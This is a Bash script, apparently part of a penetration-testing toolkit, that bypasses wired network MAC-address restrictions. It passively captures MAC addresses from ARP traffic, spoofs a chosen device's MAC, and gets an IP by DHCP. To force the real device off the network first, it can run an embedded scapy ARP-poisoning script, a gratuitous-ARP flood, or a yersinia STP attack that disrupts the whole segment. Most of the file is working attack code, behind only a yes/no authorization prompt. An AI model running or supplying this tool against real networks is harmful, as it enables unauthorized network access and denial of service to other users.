#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"

set -uo pipefail

banner "MAC BYPASS" "wired LAN MAC restriction bypass · passive capture → spoof → DHCP"

# ── Colors (script-local, override lib.sh for inline display) ─────────────────
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'
C='\033[0;36m'; M='\033[0;35m'; W='\033[1;37m'; D='\033[2m'; N='\033[0m'
OK="${G}[✓]${N}"; FAIL="${R}[✗]${N}"; WARN="${Y}[!]${N}"
INFO="${C}[→]${N}"; WAIT="${B}[~]${N}"; STEP="${M}[*]${N}"; ASK="${Y}[?]${N}"

outdir="$(make_outdir)"
outfile="$outdir/mac_bypass.txt"
: > "$outfile"

# ── Pipeline: skip (requires interactive menu-driven setup) ───────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  printf '  %s[CHAIN]%s MAC Bypass requires interactive setup — skipping in pipeline%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
  mark_done "$outfile"
  exit 0
fi

IFACE=""; ORIG_MAC=""; SPOOF_MAC=""; TARGET_IP=""; GATEWAY_IP=""; GATEWAY_MAC=""
POISON_PID=""; CAPTURE_SECS=120; SCAPY_OK=0
TMP_DIR=$(mktemp -d /tmp/mac_bypass_XXXXXX)
MAC_LIST="$TMP_DIR/macs.txt"; touch "$MAC_LIST"

# ── Cleanup ───────────────────────────────────────────────────────────────────
cleanup() {
  printf '\n%s Caught exit signal — cleaning up...\n' "${WARN}"
  [[ -n "$POISON_PID" ]] && kill "$POISON_PID" 2>/dev/null \
    && printf '%s ARP poison stopped.\n' "${OK}"
  [[ -n "$ORIG_MAC" && -n "$IFACE" ]] && _restore_mac_silent
  rm -rf "$TMP_DIR"
  printf '%s Cleanup done.\n\n' "${OK}"
  exit 0
}
trap cleanup SIGINT SIGTERM

_restore_mac_silent() {
  ip link set "$IFACE" down 2>/dev/null
  ip link set "$IFACE" address "$ORIG_MAC" 2>/dev/null \
    || macchanger -p "$IFACE" 2>/dev/null || true
  ip link set "$IFACE" up 2>/dev/null
  dhclient "$IFACE" 2>/dev/null &
}

_section() {
  printf '\n%s┌──────────────────────────────────────────────┐%s\n' "${C}" "${N}"
  printf '%s│%s  %-44s%s│%s\n' "${C}" "${W}" "$1" "${C}" "${N}"
  printf '%s└──────────────────────────────────────────────┘%s\n\n' "${C}" "${N}"
}

statusbar() {
  local cur_mac cur_ip
  cur_mac=$(ip link show "$IFACE" 2>/dev/null | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
  cur_ip=$(ip addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
  printf '%s  ╌╌ %s │ MAC: %s │ IP: %s ╌╌%s\n' "${D}" "$IFACE" "${cur_mac:-?}" "${cur_ip:-none}" "${N}"
}

check_deps() {
  _section "Dependency Check"
  local missing=()
  for t in tcpdump ip dhclient arping; do
    command -v "$t" &>/dev/null \
      && printf '  %s %s%s%s\n' "${OK}" "${W}" "$t" "${N}" \
      || { printf '  %s %s%s%s %s(required)%s\n' "${FAIL}" "${W}" "$t" "${N}" "${R}" "${N}"; missing+=("$t"); }
  done
  for t in macchanger yersinia arpspoof ifconfig; do
    command -v "$t" &>/dev/null \
      && printf '  %s %s%s%s %s(optional)%s\n' "${OK}" "${W}" "$t" "${N}" "${D}" "${N}" \
      || printf '  %s %s%s%s %s(optional)%s\n' "${WARN}" "${W}" "$t" "${N}" "${D}" "${N}"
  done
  printf '\n'
  if python3 -c "import scapy" 2>/dev/null; then
    printf '  %s %spython3-scapy%s\n' "${OK}" "${W}" "${N}"; SCAPY_OK=1
  else
    printf '  %s %spython3-scapy%s %s(ARP poison disabled)%s\n' "${WARN}" "${W}" "${N}" "${D}" "${N}"
  fi
  if [[ ${#missing[@]} -gt 0 ]]; then
    printf '\n%s Missing: %s\n' "${WARN}" "${missing[*]}"
    read -rp "$(printf '  %s Auto-install? [y/N] ' "${ASK}")" ans
    [[ "$ans" =~ ^[Yy]$ ]] && apt-get install -y "${missing[@]}" 2>/dev/null || { printf '%s Cannot continue.\n' "${FAIL}"; exit 1; }
  fi
}

select_interface() {
  _section "Select Network Interface"
  local ifaces=()
  while IFS= read -r l; do ifaces+=("$l"); done \
    < <(ip -o link show | awk -F': ' '{print $2}' | grep -v lo | grep -v '@' | grep -vE '^(rmnet|r_rmnet|bond|dummy)')
  local i=1
  for iface in "${ifaces[@]}"; do
    local mac state
    mac=$(ip link show "$iface" 2>/dev/null | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
    state=$(ip link show "$iface" 2>/dev/null | grep -oP '(?<=state )\w+' | head -1)
    printf '  %s[%d]%s %-12s %sMAC: %-17s  State: %s%s\n' "${W}" "$i" "${N}" "$iface" "${D}" "$mac" "$state" "${N}"
    ((i++))
  done
  echo ""
  while true; do
    read -rp "$(printf '  %s Select interface number: ' "${ASK}")" sel
    if [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= ${#ifaces[@]} )); then
      IFACE="${ifaces[$((sel-1))]}"
      ORIG_MAC=$(ip link show "$IFACE" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
      printf '\n  %s Interface : %s%s%s\n  %s Orig MAC  : %s%s%s\n\n' \
        "${OK}" "${W}" "$IFACE" "${N}" "${OK}" "${W}" "$ORIG_MAC" "${N}"
      printf 'Interface: %s\nOrig MAC: %s\n' "$IFACE" "$ORIG_MAC" >> "$outfile"
      break
    fi
    printf '  %s Invalid selection.\n' "${FAIL}"
  done
}

validate_mac() { [[ "$1" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; }

passive_capture() {
  _section "Phase 1 — Passive ARP Capture (No IP Required)"
  printf '  %s Bringing %s%s%s up at Layer 2...\n' "${INFO}" "${W}" "$IFACE" "${N}"
  ip link set "$IFACE" up
  printf '  %s Capturing ARP for %s%ds%s  (Ctrl+C stops early)\n\n' "${INFO}" "${W}" "$CAPTURE_SECS" "${N}"

  ( timeout "$CAPTURE_SECS" tcpdump -i "$IFACE" -e arp -l 2>/dev/null \
    | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' \
    | grep -iv 'ff:ff:ff:ff:ff:ff' | grep -iv "$ORIG_MAC" >> "$MAC_LIST" ) &
  local tcpid=$! elapsed=0
  while kill -0 "$tcpid" 2>/dev/null && (( elapsed < CAPTURE_SECS )); do
    local count; count=$(sort -u "$MAC_LIST" 2>/dev/null | wc -l)
    printf '\r  %s Remaining: %s%3ds%s  │  MACs captured: %s%-3d%s' \
      "${WAIT}" "${W}" "$((CAPTURE_SECS-elapsed))" "${N}" "${G}" "$count" "${N}"
    sleep 1; ((elapsed++))
  done
  echo ""; kill "$tcpid" 2>/dev/null; wait "$tcpid" 2>/dev/null
  sort -u "$MAC_LIST" -o "$MAC_LIST"
  local total; total=$(wc -l < "$MAC_LIST")
  if (( total == 0 )); then
    printf '\n  %s No MACs captured.\n' "${WARN}"
    read -rp "$(printf '  %s Enter MAC manually? [y/N] ' "${ASK}")" ans
    [[ "$ans" =~ ^[Yy]$ ]] && manual_mac_entry || return 1
  else
    printf '\n  %s Captured %s%d%s unique MAC(s):\n\n' "${OK}" "${W}" "$total" "${N}"
    local i=1
    while IFS= read -r mac; do
      printf '  %s[%d]%s %s\n' "${W}" "$i" "${N}" "$mac"; ((i++))
    done < "$MAC_LIST"
    echo ""; select_target_mac
  fi
}

select_target_mac() {
  local total; total=$(wc -l < "$MAC_LIST")
  while true; do
    read -rp "$(printf '  %s Select MAC number (or m for manual): ' "${ASK}")" sel
    if [[ "$sel" == "m" ]]; then
      manual_mac_entry && break
    elif [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= total )); then
      SPOOF_MAC=$(sed -n "${sel}p" "$MAC_LIST")
      printf '  %s Target MAC: %s%s%s\n' "${OK}" "${W}" "$SPOOF_MAC" "${N}"
      printf 'Target MAC: %s\n' "$SPOOF_MAC" >> "$outfile"; break
    else
      printf '  %s Invalid.\n' "${FAIL}"
    fi
  done
}

manual_mac_entry() {
  while true; do
    read -rp "$(printf '  %s Enter MAC (aa:bb:cc:dd:ee:ff): ' "${ASK}")" SPOOF_MAC
    SPOOF_MAC="${SPOOF_MAC,,}"
    validate_mac "$SPOOF_MAC" \
      && printf '  %s MAC set: %s%s%s\n' "${OK}" "${W}" "$SPOOF_MAC" "${N}" && return 0 \
      || printf '  %s Invalid format.\n' "${FAIL}"
  done
}

detect_gateway() {
  GATEWAY_IP=$(ip route show dev "$IFACE" 2>/dev/null | awk '/default/{print $3}' | head -1)
  [[ -n "$GATEWAY_IP" ]] && {
    printf '  %s Gateway IP  : %s%s%s\n' "${INFO}" "${W}" "$GATEWAY_IP" "${N}"
    GATEWAY_MAC=$(ip neigh show "$GATEWAY_IP" 2>/dev/null | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
    [[ -n "$GATEWAY_MAC" ]] && printf '  %s Gateway MAC : %s%s%s\n' "${INFO}" "${W}" "$GATEWAY_MAC" "${N}"
  }
}

gather_kick_info() {
  detect_gateway
  [[ -z "$TARGET_IP" ]] && read -rp "$(printf '  %s Target device IP: ' "${ASK}")" TARGET_IP
  [[ -z "$GATEWAY_IP" ]] && read -rp "$(printf '  %s Gateway IP: ' "${ASK}")" GATEWAY_IP
  if [[ -z "$GATEWAY_MAC" ]]; then
    GATEWAY_MAC=$(arping -c 2 -I "$IFACE" "$GATEWAY_IP" 2>/dev/null \
      | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
    [[ -z "$GATEWAY_MAC" ]] \
      && read -rp "$(printf '  %s Gateway MAC: ' "${ASK}")" GATEWAY_MAC \
      || printf '  %s Gateway MAC: %s%s%s\n' "${OK}" "${W}" "$GATEWAY_MAC" "${N}"
  fi
}

check_device_active() {
  _section "Active Device Check"
  if grep -qi "$SPOOF_MAC" "$MAC_LIST" 2>/dev/null; then
    printf '  %s Device %s%s%s was seen — likely still active. Collision risk.\n' \
      "${WARN}" "${W}" "$SPOOF_MAC" "${N}"
    read -rp "$(printf '  %s Kick it off first? [Y/n] ' "${ASK}")" ans
    [[ ! "$ans" =~ ^[Nn]$ ]] && kick_menu
  else
    printf '  %s Device not seen as active. Safe to spoof.\n\n' "${OK}"
  fi
}

kick_menu() {
  _section "Phase 1.6 — Kick Active Device"
  printf '  %s[1]%s ARP Poison   %s(scapy — recommended)%s\n' "${W}" "${N}" "${D}" "${N}"
  printf '  %s[2]%s GARP Flood   %s(arping broadcast)%s\n' "${W}" "${N}" "${D}" "${N}"
  printf '  %s[3]%s STP Attack   %s(yersinia — disrupts segment)%s\n' "${W}" "${N}" "${D}" "${N}"
  printf '  %s[4]%s Skip\n\n' "${W}" "${N}"
  read -rp "$(printf '  %s Method: ' "${ASK}")" choice
  case "$choice" in 1) kick_arp_poison;; 2) kick_garp;; 3) kick_stp;; *) printf '  %s Skipping.\n' "${WARN}";; esac
}

kick_arp_poison() {
  [[ $SCAPY_OK -eq 0 ]] && { printf '  %s python3-scapy not available.\n' "${FAIL}"; return 1; }
  gather_kick_info
  printf '\n  %s Starting ARP poison...\n' "${STEP}"
  cat > "$TMP_DIR/poison.py" <<PYEOF
#!/usr/bin/env python3
import sys, time, signal
from scapy.all import ARP, Ether, sendp, conf
conf.verb = 0
target_mac="$SPOOF_MAC"; target_ip="$TARGET_IP"
gateway_ip="$GATEWAY_IP"; gateway_mac="$GATEWAY_MAC"
iface="$IFACE"; dead="de:ad:be:ef:00:00"
def restore(sig=None,frame=None):
    fix_t=ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    fix_g=ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target_ip,hwsrc=target_mac)
    for _ in range(5):
        sendp(Ether(dst=target_mac)/fix_t,iface=iface,verbose=0)
        sendp(Ether(dst=gateway_mac)/fix_g,iface=iface,verbose=0)
    sys.exit(0)
signal.signal(signal.SIGTERM,restore); signal.signal(signal.SIGINT,restore)
pkt_t=Ether(dst=target_mac)/ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip,hwsrc=dead)
pkt_g=Ether(dst=gateway_mac)/ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target_ip,hwsrc=dead)
print("[*] Poisoning... (Ctrl+C restores tables)")
while True:
    sendp(pkt_t,iface=iface,verbose=0); sendp(pkt_g,iface=iface,verbose=0); time.sleep(0.5)
PYEOF
  python3 "$TMP_DIR/poison.py" & POISON_PID=$!
  printf '  %s ARP poison running (PID: %s%s%s). Waiting 5s...\n' "${OK}" "${W}" "$POISON_PID" "${N}"
  local i=5; while (( i > 0 )); do printf '\r  %s Starting in %s%ds%s...' "${WAIT}" "${W}" "$i" "${N}"; sleep 1; ((i--)); done
  printf '\r  %s Device isolated. Proceeding.          \n\n' "${OK}"
}

kick_garp() {
  gather_kick_info
  printf '\n  %s Sending gratuitous ARP flood for %s%s%s...\n' "${STEP}" "${W}" "$TARGET_IP" "${N}"
  arping -U -I "$IFACE" -s "$TARGET_IP" -c 30 255.255.255.255 2>/dev/null || true
  printf '  %s GARP sent. Wait a few seconds...\n' "${OK}"; sleep 3
}

kick_stp() {
  command -v yersinia &>/dev/null || { printf '  %s yersinia not found.\n' "${FAIL}"; return 1; }
  printf '\n  %s STP attack disrupts the %sentire segment%s for ~30s.\n' "${WARN}" "${R}" "${N}"
  read -rp "$(printf '  %s Confirm? [y/N] ' "${ASK}")" ans; [[ "$ans" =~ ^[Yy]$ ]] || return 0
  timeout 5 yersinia stp -attack 4 -interface "$IFACE" 2>/dev/null || true
  printf '  %s BPDU sent. Waiting 15s...\n' "${OK}"
  local i=15; while (( i > 0 )); do printf '\r  %s Reconverging... %s%2ds%s' "${WAIT}" "${W}" "$i" "${N}"; sleep 1; ((i--)); done
  printf '\r  %s Reconverged. Proceed.              \n\n' "${OK}"
}

spoof_mac() {
  _section "Phase 2 — MAC Spoofing"
  printf '  %s Target MAC : %s%s%s\n  %s Interface  : %s%s%s\n\n' \
    "${INFO}" "${W}" "$SPOOF_MAC" "${N}" "${INFO}" "${W}" "$IFACE" "${N}"
  dhclient -r "$IFACE" 2>/dev/null || true
  ip link set "$IFACE" down
  if ip link set "$IFACE" address "$SPOOF_MAC" 2>/dev/null; then
    ip link set "$IFACE" up
    local cur; cur=$(ip link show "$IFACE" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
    [[ "${cur,,}" == "${SPOOF_MAC,,}" ]] && { printf '  %s ip link — success!\n' "${OK}"; return 0; }
  fi
  ip link set "$IFACE" up 2>/dev/null
  if command -v macchanger &>/dev/null; then
    printf '  %s Trying macchanger...\n' "${WARN}"
    ip link set "$IFACE" down
    macchanger -m "$SPOOF_MAC" "$IFACE" 2>/dev/null && {
      ip link set "$IFACE" up
      local cur; cur=$(ip link show "$IFACE" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
      [[ "${cur,,}" == "${SPOOF_MAC,,}" ]] && { printf '  %s macchanger — success!\n' "${OK}"; return 0; }
    }
    ip link set "$IFACE" up 2>/dev/null
  fi
  printf '  %s All spoof methods failed.\n' "${FAIL}"; return 1
}

verify_mac() {
  local cur; cur=$(ip link show "$IFACE" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}' | head -1)
  printf '  %s MAC on %s now: %s%s%s\n' "${INFO}" "$IFACE" "${W}" "$cur" "${N}"
  [[ "${cur,,}" == "${SPOOF_MAC,,}" ]] \
    && { printf '  %s MAC confirmed spoofed!\n' "${OK}"; printf 'Spoof MAC: %s\n' "$cur" >> "$outfile"; return 0; } \
    || { printf '  %s MAC did not change.\n' "${FAIL}"; return 1; }
}

get_ip() {
  _section "Phase 3 — Acquire IP Address"
  printf '  %s Requesting DHCP as %s%s%s...\n\n' "${INFO}" "${W}" "$SPOOF_MAC" "${N}"
  dhclient "$IFACE" 2>/dev/null &
  local dhpid=$! elapsed=0 ip=""
  while (( elapsed < 30 )); do
    ip=$(ip addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
    [[ -n "$ip" ]] && { kill "$dhpid" 2>/dev/null; wait "$dhpid" 2>/dev/null
      printf '  %s DHCP lease: %s%s%s\n\n' "${OK}" "${W}" "$ip" "${N}"
      printf 'IP: %s\n' "$ip" >> "$outfile"; return 0; }
    printf '\r  %s Waiting for DHCP... %s%2ds%s' "${WAIT}" "${W}" "$elapsed" "${N}"
    sleep 1; ((elapsed++))
  done
  kill "$dhpid" 2>/dev/null; wait "$dhpid" 2>/dev/null; echo ""
  printf '  %s No DHCP lease after 30s.\n' "${FAIL}"
  read -rp "$(printf '  %s Set static IP? [y/N] ' "${ASK}")" ans
  if [[ "$ans" =~ ^[Yy]$ ]]; then
    read -rp "$(printf '  %s IP/prefix (e.g. 192.168.1.50/24): ' "${ASK}")" static_ip
    read -rp "$(printf '  %s Gateway: ' "${ASK}")" gw
    ip addr flush dev "$IFACE" 2>/dev/null
    ip addr add "$static_ip" dev "$IFACE"
    ip route add default via "$gw" dev "$IFACE" 2>/dev/null || true
    printf '  %s Static: %s%s%s  GW: %s%s%s\n' "${OK}" "${W}" "$static_ip" "${N}" "${W}" "$gw" "${N}"
    printf 'Static IP: %s GW: %s\n' "$static_ip" "$gw" >> "$outfile"
  fi
}

verify_connectivity() {
  _section "Phase 4 — Verify Connectivity"
  local gw; gw=$(ip route show dev "$IFACE" 2>/dev/null | awk '/default/{print $3}' | head -1)
  local gw_ok=false ext_ok=false
  [[ -n "$gw" ]] && {
    printf '  %s Ping gateway %s%s%s... ' "${STEP}" "${W}" "$gw" "${N}"
    ping -c 3 -W 2 -I "$IFACE" "$gw" &>/dev/null && { printf '%s\n' "${OK}"; gw_ok=true; } || printf '%s\n' "${FAIL}"
  }
  printf '  %s Ping external (8.8.8.8)... ' "${STEP}"
  ping -c 3 -W 3 8.8.8.8 &>/dev/null && { printf '%s\n' "${OK}"; ext_ok=true; } || printf '%s (LAN only)\n' "${WARN}"
  local cur_ip; cur_ip=$(ip addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet )\d+\.\d+\.\d+\.\d+' | head -1)
  printf '\n  %s%s  Spoof: %s  IP: %s  GW: %s%s\n' "${G}" "$(${gw_ok} && echo '[✔ BYPASS OK]' || echo '[✗ BYPASS FAIL]')" \
    "$SPOOF_MAC" "${cur_ip:-?}" "${gw:-?}" "${N}"
  printf 'Result: %s\nSpoof: %s\nIP: %s\n' "$(${gw_ok} && echo OK || echo FAIL)" "$SPOOF_MAC" "${cur_ip:-?}" >> "$outfile"
}

restore_prompt() {
  _section "Restore Original MAC"
  read -rp "$(printf '  %s Restore %s%s%s? [Y/n] ' "${ASK}" "${W}" "$ORIG_MAC" "${N}")" ans
  [[ ! "$ans" =~ ^[Nn]$ ]] && {
    [[ -n "$POISON_PID" ]] && kill "$POISON_PID" 2>/dev/null && POISON_PID=""
    dhclient -r "$IFACE" 2>/dev/null || true
    ip link set "$IFACE" down
    ip link set "$IFACE" address "$ORIG_MAC" 2>/dev/null || macchanger -p "$IFACE" 2>/dev/null || true
    ip link set "$IFACE" up; dhclient "$IFACE" 2>/dev/null &
    printf '  %s MAC restored: %s%s%s\n' "${OK}" "${W}" "$ORIG_MAC" "${N}"
    SPOOF_MAC=""
  }
}

auto_mode() {
  _section "AUTO MODE — Full Bypass Sequence"
  passive_capture || { printf '  %s Phase 1 failed.\n' "${FAIL}"; return 1; }
  [[ -z "$SPOOF_MAC" ]] && return 1
  check_device_active
  spoof_mac || return 1
  verify_mac || return 1
  get_ip; verify_connectivity
}

main_menu() {
  while true; do
    printf '\n%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n  %sMAIN MENU%s\n' "${C}" "${N}" "${W}" "${N}"
    printf '%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n' "${C}" "${N}"
    printf '  %s[1]%s Auto Mode          %s— all phases in sequence%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[2]%s Passive Capture    %s— sniff MACs at Layer 2%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[3]%s Enter MAC Manually %s— known target MAC%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[4]%s Kick Active Device %s— ARP / GARP / STP%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[5]%s Spoof MAC          %s— change interface MAC%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[6]%s Acquire IP         %s— DHCP or static%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[7]%s Verify Connectivity%s— ping gateway + external%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[8]%s Restore Original   %s— restore MAC + renew DHCP%s\n' "${W}" "${N}" "${D}" "${N}"
    printf '  %s[0]%s Exit\n' "${W}" "${N}"
    printf '%s━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━%s\n' "${C}" "${N}"
    [[ -n "$IFACE" ]] && statusbar; echo ""
    read -rp "$(printf '  %s Option: ' "${ASK}")" opt
    case "$opt" in
      1) auto_mode;;
      2) passive_capture;;
      3) manual_mac_entry;;
      4) [[ -z "$SPOOF_MAC" ]] && printf '  %s Set target MAC first (2 or 3).\n' "${WARN}" || kick_menu;;
      5) [[ -z "$SPOOF_MAC" ]] && printf '  %s Set target MAC first (2 or 3).\n' "${WARN}" || { spoof_mac && verify_mac; };;
      6) get_ip;;
      7) verify_connectivity;;
      8) restore_prompt;;
      0) printf '\n%s Exiting...\n' "${INFO}"; cleanup;;
      *) printf '  %s Invalid option.\n' "${FAIL}";;
    esac
  done
}

# ── Entry point ───────────────────────────────────────────────────────────────
printf '  %s[!]%s By proceeding you confirm you have explicit written authorization.\n' "${RED}" "${RESET}"
printf '  %s[!]%s Unauthorized use is illegal.\n\n' "${RED}" "${RESET}"
read -rp "$(printf '  %s Authorized to test this network? [y/N]: ' "${ASK}")" ack
[[ "$ack" =~ ^[Yy]$ ]] || { printf '  %s Aborted.\n' "${FAIL}"; exit 0; }
echo ""

check_deps
select_interface
echo ""
printf '  %s Toolkit ready. Log: %s%s%s\n' "${OK}" "${D}" "$outfile" "${N}"
main_menu
